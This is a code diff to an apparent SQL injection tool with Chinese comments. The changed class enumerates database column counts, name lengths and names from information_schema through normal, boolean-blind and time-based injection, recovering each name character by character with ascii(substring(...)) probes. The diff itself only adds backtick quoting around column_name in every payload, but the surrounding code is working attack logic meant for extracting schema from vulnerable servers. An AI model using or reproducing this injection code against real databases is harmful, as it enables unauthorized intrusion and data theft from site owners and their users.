@@ -60,7 +60,7 @@ class SqliColumns(SqliTables):
                         # 首先是column name的长度
                         logger.debug("Start %dth column length sqli..." % (i + 1))
 
-                        column_name_len = normal_injection(select='length(column_name)',
+                        column_name_len = normal_injection(select='length(`column_name`)',
                                                            source="information_schema.columns",
                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                            limit=i,
@@ -73,7 +73,7 @@ class SqliColumns(SqliTables):
 
                         # 然后注columns name
 
-                        column_name = normal_injection(select='column_name',
+                        column_name = normal_injection(select='`column_name`',
                                                        source='information_schema.columns',
                                                        conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                        limit=i,
@@ -92,7 +92,7 @@ class SqliColumns(SqliTables):
                     logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                     logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                    retVal = build_injection(select="COUNT(column_name)",
+                    retVal = build_injection(select="COUNT(`column_name`)",
                                              source="information_schema.columns",
                                              conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                              dealpayload=self.dealpayload, data=self.Data, lens=self.len,
@@ -106,7 +106,7 @@ class SqliColumns(SqliTables):
                         # 然后注 columns_number 的 length
                         logger.debug("Start %dth column length sqli..." % (i + 1))
 
-                        retVal = build_injection(select="length(column_name)",
+                        retVal = build_injection(select="length(`column_name`)",
                                                  source="information_schema.columns",
                                                  conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                  limit=i,
@@ -124,7 +124,7 @@ class SqliColumns(SqliTables):
                         logger.debug("Start %dth column sqli..." % (i + 1))
 
                         for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                            retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
+                            retVal = build_injection(select="ascii(substring(`column_name`," + repr(j + 1) + ",1))",
                                                      source="information_schema.columns",
                                                      conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                      limit=i,
@@ -143,7 +143,7 @@ class SqliColumns(SqliTables):
                     logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                     logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                    retVal = time_injection(select="COUNT(column_name)",
+                    retVal = time_injection(select="COUNT(`column_name`)",
                                             source="information_schema.columns",
                                             conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                             dealpayload=self.dealpayload, data=self.Data, times=self.time,
@@ -157,7 +157,7 @@ class SqliColumns(SqliTables):
                         # 然后注 columns_number 的 length
                         logger.debug("Start %dth column length sqli..." % (i + 1))
 
-                        retVal = time_injection(select="length(column_name)",
+                        retVal = time_injection(select="length(`column_name`)",
                                                 source="information_schema.columns",
                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                 limit=i,
@@ -175,7 +175,7 @@ class SqliColumns(SqliTables):
                         logger.debug("Start %dth column sqli..." % (i + 1))
 
                         for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                            retVal = time_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
+                            retVal = time_injection(select="ascii(substring(`column_name`," + repr(j + 1) + ",1))",
                                                     source="information_schema.columns",
                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                     limit=i,
